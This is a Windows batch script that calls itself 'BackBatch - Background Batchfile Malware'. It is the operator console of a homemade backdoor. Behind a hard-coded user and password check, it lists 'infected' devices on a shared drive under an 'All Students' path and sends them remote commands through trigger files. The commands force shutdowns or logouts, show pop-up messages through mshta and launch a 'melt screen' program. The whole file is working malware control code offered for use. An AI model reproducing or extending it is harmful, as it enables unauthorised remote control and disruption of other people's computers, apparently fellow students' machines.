:: BackBatch - Background Batchfile Malware
:: By: 1k0de
::
:: INTENDED FOR CMD ON WINDOWS TERMINAL - ALSO WORKS FOR NORMAL CMD
::
:: This website has dangerous batch file scripts, use some for the malware:
:: https://sites.google.com/site/rabstechnosoft/batch-programming-dangerous-viruses-lesson-2

@echo off
chcp 65001
SETLOCAL EnableDelayedExpansion
if "!FILE_UNLOCK_KEY!" == "_@$tu35hg92ffj4g35g$^_U%&&JH+EGRwghwqQE|FW{RHp5" (
	goto view_file
)
goto crash

:view_file
cls
title Back Batch
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set ESC=%%b
)
goto LOAD_BackBatch
goto crash

:LOAD_BackBatch
cls
set "WaitTime=1"
cls
!WaitLoad!
:: ________________________________________________________BACK BATCH TITLE____________________________________________________________
echo.
echo ▀█████████▄     ▄████████  ▄████████    ▄█   ▄█▄      ▀█████████▄     ▄████████     ███      ▄████████    ▄█    █▄    
echo   ███    ███   ███    ███ ███    ███   ███ ▄███▀        ███    ███   ███    ███ ▀█████████▄ ███    ███   ███    ███   
echo   ███    ███   ███    ███ ███    █▀    ███▐██▀          ███    ███   ███    ███    ▀███▀▀██ ███    █▀    ███    ███   
echo  ▄███▄▄▄██▀    ███    ███ ███         ▄█████▀          ▄███▄▄▄██▀    ███    ███     ███   ▀ ███         ▄███▄▄▄▄███▄▄ 
echo ▀▀███▀▀▀██▄  ▀███████████ ███        ▀▀█████▄         ▀▀███▀▀▀██▄  ▀███████████     ███     ███        ▀▀███▀▀▀▀███▀  
echo   ███    ██▄   ███    ███ ███    █▄    ███▐██▄          ███    ██▄   ███    ███     ███     ███    █▄    ███    ███   
echo   ███    ███   ███    ███ ███    ███   ███ ▀███▄        ███    ███   ███    ███     ███     ███    ███   ███    ███   
echo ▄█████████▀    ███    █▀  ████████▀    ███   ▀█▀      ▄█████████▀    ███    █▀     ▄████▀   ████████▀    ███    █▀    
echo                                        ▀                                                                              
echo By: 1k0de
echo.
echo ======================================================================================================================
echo.
:: _______________________________________________________ END OF SECTION _____________________________________________________________
PING LOCALHOST -n 3 > nul
ping localhost -n %WaitTime% > nul
echo [-] Loading...
ping localhost -n %WaitTime% > nul
:: ________________________________________________________Text Decorations____________________________________________________________
echo [-] Loading: Text colours...
ping localhost -n %WaitTime% > nul
set "DarkWhite=!ESC![90m"
set "Red=!ESC![91m"
set "Green=!ESC![92m"
set "Yellow=!ESC![93m"
set "Blue=!ESC![94m"
set "Purple=!ESC![95m"
set "Cyan=!ESC![96m"
set "White=!ESC![97m"
echo [-] Loading: Background colours...
ping localhost -n %WaitTime% > nul
set "b_black=!ESC![100m"
set "b_red=!ESC![101m"
set "b_green=!ESC![102m"
set "b_yellow=!ESC![103;30m"
set "b_blue=!ESC![104m"
set "b_purple=!ESC![105m"
set "b_cyan=!ESC![106m"
set "b_white=!ESC![107m"
echo [-] Loading: Colour combinations...
ping localhost -n %WaitTime% > nul
set "dark_red=!ESC![31m"
set "white_black=!ESC![7m"
set "red_black=!ESC![7;31m"
echo [-] Loading: Text styles...
ping localhost -n %WaitTime% > nul
set "reset=!ESC![0m"
set "bold=!ESC![1m"
set "underline=!ESC![4m"
ping localhost -n %WaitTime% > nul
:: _______________________________________________________ END OF SECTION _____________________________________________________________
echo [-] Loading: Variables...
:: ______________________________________________MAIN LOCATION VARIABLES ARE SET HERE__________________________________________________
set "FILE_Collaboration=P:\"
set "FILE_BackBatch=P:\Composite\All Students\BackBatch"
set "FILE_Devices=P:\Composite\All Students\BackBatch\Devices"
:: _______________________________________________________ END OF SECTION _____________________________________________________________
echo.
ping localhost -n %WaitTime% > nul
echo [!green!+!reset!] Success: Loaded decorations...
ping localhost -n %WaitTime% > nul
:: _____________________________________________________________USER CHECK_____________________________________________________________
echo [!yellow!^^!!reset!] User check initiated...
ping localhost -n %WaitTime% > nul
echo [-] %ComputerName% USER: %Username%
ping localhost -n %WaitTime% > nul
if "!Username!" == "adeld" (
	goto verified_user
)
if "!Username!" == "karim.dalati1" (
	goto verified_user
)
echo [!red!^^!!reset!] Error: User not verified^^!
echo.
echo !reset!!red_black![Press Any Key]!reset!
pause > nul
exit
goto crash
:: __________________________________________________________ END OF SECTION __________________________________________________________

:verified_user
echo [!green!+!reset!] Sucess: Verified user...
ping localhost -n 2 > nul
echo.
echo !reset!!red_black![Press Any Key]!reset!
pause > nul
goto lock_screen
goto crash

:lock_screen
cls
:: ________________________________________________________BACK BATCH TITLE____________________________________________________________
echo.
echo ▀█████████▄     ▄████████  ▄████████    ▄█   ▄█▄      ▀█████████▄     ▄████████     ███      ▄████████    ▄█    █▄    
echo   ███    ███   ███    ███ ███    ███   ███ ▄███▀        ███    ███   ███    ███ ▀█████████▄ ███    ███   ███    ███   
echo   ███    ███   ███    ███ ███    █▀    ███▐██▀          ███    ███   ███    ███    ▀███▀▀██ ███    █▀    ███    ███   
echo  ▄███▄▄▄██▀    ███    ███ ███         ▄█████▀          ▄███▄▄▄██▀    ███    ███     ███   ▀ ███         ▄███▄▄▄▄███▄▄ 
echo ▀▀███▀▀▀██▄  ▀███████████ ███        ▀▀█████▄         ▀▀███▀▀▀██▄  ▀███████████     ███     ███        ▀▀███▀▀▀▀███▀  
echo   ███    ██▄   ███    ███ ███    █▄    ███▐██▄          ███    ██▄   ███    ███     ███     ███    █▄    ███    ███   
echo   ███    ███   ███    ███ ███    ███   ███ ▀███▄        ███    ███   ███    ███     ███     ███    ███   ███    ███   
echo ▄█████████▀    ███    █▀  ████████▀    ███   ▀█▀      ▄█████████▀    ███    █▀     ▄████▀   ████████▀    ███    █▀    
echo                                        ▀                                                                              
echo By: 1k0de
echo.
echo !underline!======================================================================================================================!reset!
echo.
:: _______________________________________________________ END OF SECTION _____________________________________________________________
echo [!red!-!reset!] !bold!Lock Screen:!reset!
echo.
SET "psCommand=powershell -Command "$pword = read-host '!red_black!Enter Password!reset!' -AsSecureString ; ^
    $BSTR=[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pword); ^
        -join("0",[System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR))""
for /f "usebackq delims=" %%p in (`%psCommand%`) do set "LOCK_SCREEN_INP=%%p"
SET "LOCK_SCREEN_INP=!LOCK_SCREEN_INP:~1!"
if "!LOCK_SCREEN_INP!" == "_e3e_pi89" (
	echo.
	echo [!green!+!reset!] Correct^^!
	echo.
	echo !white_black![Press Any Key]!reset!
	pause > nul
	goto Back_Batch_Console
)
echo.
echo [!red!^^!!reset!] Incorrect^^!
echo.
echo !white_black![Press Any Key]!reset!
pause > nul
goto lock_screen
goto crash

:Back_Batch_Console
cls
:: ________________________________________________________BACK BATCH TITLE____________________________________________________________
echo.
echo ▀█████████▄     ▄████████  ▄████████    ▄█   ▄█▄      ▀█████████▄     ▄████████     ███      ▄████████    ▄█    █▄    
echo   ███    ███   ███    ███ ███    ███   ███ ▄███▀        ███    ███   ███    ███ ▀█████████▄ ███    ███   ███    ███   
echo   ███    ███   ███    ███ ███    █▀    ███▐██▀          ███    ███   ███    ███    ▀███▀▀██ ███    █▀    ███    ███   
echo  ▄███▄▄▄██▀    ███    ███ ███         ▄█████▀          ▄███▄▄▄██▀    ███    ███     ███   ▀ ███         ▄███▄▄▄▄███▄▄ 
echo ▀▀███▀▀▀██▄  ▀███████████ ███        ▀▀█████▄         ▀▀███▀▀▀██▄  ▀███████████     ███     ███        ▀▀███▀▀▀▀███▀  
echo   ███    ██▄   ███    ███ ███    █▄    ███▐██▄          ███    ██▄   ███    ███     ███     ███    █▄    ███    ███   
echo   ███    ███   ███    ███ ███    ███   ███ ▀███▄        ███    ███   ███    ███     ███     ███    ███   ███    ███   
echo ▄█████████▀    ███    █▀  ████████▀    ███   ▀█▀      ▄█████████▀    ███    █▀     ▄████▀   ████████▀    ███    █▀    
echo                                        ▀                                                                              
echo By: 1k0de ^| !bold![Version]:!reset! !cyan!2.0.0!reset! !bold![Made By]: !reset!!cyan!1k0de!reset!
echo.
::echo !underline!======================================================================================================================!reset!
::echo.
:: _______________________________________________________ END OF SECTION _____________________________________________________________
:: ________________________________________________________ Menu Section ______________________________________________________________
echo !white_black!Main Menu!reset!
echo.
if exist "!FILE_Collaboration!" (
	echo !bold!^|!reset!       Path: !green!!FILE_Collaboration!!reset! !bold!loaded!reset!
) else (
	echo !bold!^|!reset!       Path: !green!!FILE_Collaboration!!reset! !red!not-loaded!reset!
)
if exist "!FILE_BackBatch!" (
	echo !bold!^|!reset!       Path: !green!!FILE_BackBatch!!reset! !bold!loaded!reset!
) else (
	echo !bold!^|!reset!       Path: !green!!FILE_BackBatch!!reset! !red!not-loaded!reset!
)
if exist "!FILE_Devices!" (
	echo !bold!^|!reset!       Path: !green!!FILE_Devices!!reset! !bold!loaded!reset!
) else (
	echo !bold!^|!reset!       Path: !green!!FILE_Devices!!reset! !red!not-loaded!reset!
)
echo.
echo !white_black!Available Tools!reset!
echo.
echo !bold!^|!reset!       Remote Command Execution !bold![Id: 1]!reset!
echo !bold!^|!reset!       More Comming Soon
echo.
echo !white_black!Available Commands!reset!
echo.
echo !bold!^|!reset!       !blue!exit!reset!
echo !bold!^|!reset!       !blue!info!reset!
echo !bold!^|!reset!       !blue!clear/cls!reset!
echo !bold!^|!reset!       !blue!list_devices!reset!
echo !bold!^|!reset!       !blue!use!reset!
echo.
goto command_inp
:: _______________________________________________________ END OF SECTION _____________________________________________________________
goto crash

:command_inp
set "CmdInput="
echo =================== %time% %date%
set /p "CmdInput=!reset!MCP>: !bold!"
echo.
if "!CmdInput!" == "cls" (
	goto Back_Batch_Console
)
if "!CmdInput!" == "clear" (
	goto Back_Batch_Console
)
if "!CmdInput!" == "exit" (
	exit
)
if "!CmdInput!" == "info" (
	goto info
)
if "!CmdInput!" == "list_devices" (
	goto list_devices
)
if "!CmdInput!" == "use" (
	goto use
)
echo !reset!!red_black!Invalid Command:!reset! !bold!!CmdInput!!reset!
echo.
goto command_inp
goto crash

:info
set "InfoInp="
set /p "Info_Inp=!reset!!white_black!Command:!reset! "
if "!Info_Inp!" == "cls" (
	echo !yellow!This command clears the console window^^! [Alternative Command: clear]!reset!
	echo.
	goto command_inp
)
if "!Info_Inp!" == "clear" (
	echo !yellow!This command clears the console window^^! [Alternative Command: cls]!reset!
	echo.
	goto command_inp
)
if "!Info_Inp!" == "exit" (
	echo !yellow!This command exits the BackBatch app^^!!reset!
	echo.
	goto command_inp
)
if "!Info_Inp!" == "info" (
	echo !yellow!This command gives you info on any of the existing commands^^!!reset!
	echo.
	goto command_inp
)
if "!Info_Inp!" == "list_devices" (
	echo !yellow!This command will list all the devices infected by BackBatch script^^!!reset!
	echo.
	goto command_inp
)
if "!Info_Inp!" == "use" (
	echo !yellow!This command allows you to use any of the tools^^!!reset!
	echo.
	goto command_inp
)
echo !red!Invalid command: !Info_Inp!!reset!
echo.
goto command_inp
goto crash

:list_devices
if exist "!FILE_Devices!" (
	cd !FILE_Devices!
	dir
	echo.
	goto command_inp
) else (
	echo !reset!!red_black!Error:!reset! The Devices directory !yellow![!FILE_Devices!]!reset! does not exist^^!!reset!
	echo.
	goto command_inp
)
goto crash

:use
set "Use_Inp="
set /p "Use_Inp=!reset!!white_black!Tool Id:!reset! "
if "!Use_Inp!" == "1" (
	echo.
	echo !reset!!green!Launching tool: Remote Command Execution...!reset!
	ping localhost -n 2 > nul
	goto rce_check
	goto crash
)
echo !reset!!red_black!Error:!reset! Invalid tool id^^!
echo.
goto command_inp
goto crash

:rce_check
echo !reset!!green!Checking files...
ping localhost -n 2 > nul
echo.
if exist "!FILE_Collaboration!" (
	echo !reset!!white_black!Success:!reset! Collaboration found^^!
	if exist "!FILE_BackBatch!" (
		echo !reset!!white_black!Success:!reset! BackBatch found^^!
		if exist "!FILE_Devices!" (
			echo !reset!!white_black!Success:!reset! Devices found^^!
			goto remote_cmd_exec
		) else (
			echo !reset!!red_black!Error:!reset! Devices file is missing^^!
			echo.
			echo command_inp
		)
	) else (
		echo !reset!!red_black!Error:!reset! BackBatch file is missing^^!
		echo.
		goto command_inp
	)
) else (
	echo !reset!!red_black!Error:!reset! Collaboration file is missing^^!
	echo.
	goto command_inp
)
goto crash

:remote_cmd_exec
echo.
set "Computer_ID_1="
set /p "Computer_ID_1=!reset!!white_black!Computer id:!reset! "
if exist "!FILE_Devices!\!Computer_ID_1!" (
	echo !reset!!green!Success:!reset! Found computer [!Computer_ID_1!]
	echo.
	goto rce_pc_found
) else (
	echo !reset!!red_black!Error:!reset! Could not find computer [!Computer_ID_1!]
	echo.
	goto command_inp
)
goto crash

:rce_pc_found
set "VICTIM_CMD="
set "VICTIM_SHUTDOWN_TIMER="
set "VICTIM_LOGOUT_TIME="
set "VICTIM_MSG_CONTENT="
set "JAVA_ALERT_1=mshta javascript:alert("
set "JAVA_ALERT_2=);close();"
echo !reset!!yellow!Type 'return' to return to main menu^^!!reset!
set /p "VICTIM_CMD=!reset!!white_black!Enter Remote Command:!reset! "
if "!VICTIM_CMD!" == "return" (
	echo.
	goto command_inp
)
if "!VICTIM_CMD!" == "shutdown" (
	set /p "VICTIM_SHUTDOWN_TIMER=!reset!!green!Shutdown Seconds:!reset!!yellow![Type none for 0 seconds]!reset! "
	ping localhost -n 2 > nul
	echo.
	if exist "!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll" (
		if "!VICTIM_SHUTDOWN_TIMER!" == "none" (
			echo shutdown /s /t 0>"!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll"
		) else (
			echo shutdown /s /t !VICTIM_SHUTDOWN_TIMER!>"!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll"
		)
		if exist "!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll" (
			echo exec_now>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
			ping localhost -n 3 > nul
			echo dont_exec>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
			echo echo No Command>"!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll"
			echo !reset!!green!Successfully completed shutdown...
			echo.
			goto rce_pc_found
			goto crash
		) else (
			echo !reset!!red_black!Error:!reset! Cannot find EXEC_CMD.dll, critical error^^!
			echo.
			goto rce_pc_found
			goto crash
		)
	) else (
		echo !reset!!red_black!Error:!reset! Cannot find CMD_EXEC.dll, critical error^^!
		echo.
		goto rce_pc_found
		goto crash
	)
)
if "!VICTIM_CMD!" == "msg" (
	set /p "VICTIM_MSG_CONTENT=!reset!!green!Message Text:!reset! "
	ping localhost -n 2 > nul
	if exist "!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll" (
		echo !JAVA_ALERT_1!"!VICTIM_MSG_CONTENT!"!JAVA_ALERT_2!>"!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll"
		if exist "!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll" (
			echo exec_now>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
			ping localhost -n 3 > nul
			echo dont_exec>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
			echo echo No Command>"!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll"
			echo !reset!!green!Successfully sent message...
			echo.
			goto rce_pc_found
			goto crash
		) else (
			echo !reset!!red_black!Error:!reset! Cannot find EXEC_CMD.dll, critical error^^!
			echo.
			goto rce_pc_found
			goto crash
		)
	) else (
		echo !reset!!red_black!Error:!reset! Cannot find CMD_EXEC.dll, critical error^^!
		echo.
		goto rce_pc_found
		goto crash
	)
)
if "!VICTIM_CMD!" == "melt" (
	if exist "!FILE_BackBatch!\melt_screen.exe" (
		if exist "!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll" (
			echo !FILE_BackBatch!\melt_screen.exe>"!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll"
			if exist "!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll" (
				echo exec_now>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
				ping localhost -n 3 > nul
				echo dont_exec>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
				echo echo No Command>"!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll"
				echo !reset!!green!Successfully added melt effect to victims device...
				echo.
				goto rce_pc_found
				goto crash
			) else (
				echo !reset!!red_black!Error:!reset! Cannot find EXEC_CMD.dll, critical error^^!
				echo.
				goto rce_pc_found
				goto crash
			)
		) else (
			echo !reset!!red_black!Error:!reset! Cannot find CMD_EXEC.dll, critical error^^!
			echo.
			goto rce_pc_found
			goto crash
		)
	) else (
		echo !reset!!red_black!Error:!reset! Cannot find melt_screen.exe, critical error^^!
		echo.
		goto rce_pc_found
		goto crash
	)
)
if "!VICTIM_CMD!" == "logout" (
	set /p "VICTIM_LOGOUT_TIMER=!reset!!green!Logout Seconds:!reset!!yellow![Type none for 0 seconds]!reset! "
	ping localhost -n 2 > nul
	if exist "!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll" (
		if "!VICTIM_LOGOUT_TIMER!" == "none" (
			echo shutdown /l /t 0>"!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll"
		) else (
			echo shutdown /l /t !VICTIM_LOGOUT_TIMER!>"!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll"
		)
		if exist "!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll" (
			echo exec_now>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
			ping localhost -n 3 > nul
			echo dont_exec>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
			echo echo No Command>"!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll"
			echo !reset!!green!Successfully sent message...
			echo.
			goto rce_pc_found
			goto crash
		) else (
			echo !reset!!red_black!Error:!reset! Cannot find EXEC_CMD.dll, critical error^^!
			echo.
			goto rce_pc_found
			goto crash
		)
	) else (
		echo !reset!!red_black!Error:!reset! Cannot find CMD_EXEC.dll, critical error^^!
		echo.
		goto rce_pc_found
		goto crash
	)
)
echo !reset!!red_black!Error:!reset! This command is invalid^^! [!VICTIM_CMD!]
echo.
goto rce_pc_found
goto crash

:crash
cls
:: ________________________________________________________BACK BATCH TITLE____________________________________________________________
echo.
echo ▀█████████▄     ▄████████  ▄████████    ▄█   ▄█▄      ▀█████████▄     ▄████████     ███      ▄████████    ▄█    █▄    
echo   ███    ███   ███    ███ ███    ███   ███ ▄███▀        ███    ███   ███    ███ ▀█████████▄ ███    ███   ███    ███   
echo   ███    ███   ███    ███ ███    █▀    ███▐██▀          ███    ███   ███    ███    ▀███▀▀██ ███    █▀    ███    ███   
echo  ▄███▄▄▄██▀    ███    ███ ███         ▄█████▀          ▄███▄▄▄██▀    ███    ███     ███   ▀ ███         ▄███▄▄▄▄███▄▄ 
echo ▀▀███▀▀▀██▄  ▀███████████ ███        ▀▀█████▄         ▀▀███▀▀▀██▄  ▀███████████     ███     ███        ▀▀███▀▀▀▀███▀  
echo   ███    ██▄   ███    ███ ███    █▄    ███▐██▄          ███    ██▄   ███    ███     ███     ███    █▄    ███    ███   
echo   ███    ███   ███    ███ ███    ███   ███ ▀███▄        ███    ███   ███    ███     ███     ███    ███   ███    ███   
echo ▄█████████▀    ███    █▀  ████████▀    ███   ▀█▀      ▄█████████▀    ███    █▀     ▄████▀   ████████▀    ███    █▀    
echo                                        ▀                                                                              
echo By: 1k0de
echo.
echo ======================================================================================================================
echo.
:: _______________________________________________________ END OF SECTION _____________________________________________________________
echo [^^!] Back Batch has unexpectedly crashed^^! Please report^^!
echo.
echo [ PRESS ANY KEY TO EXIT ]
pause > nul
exit
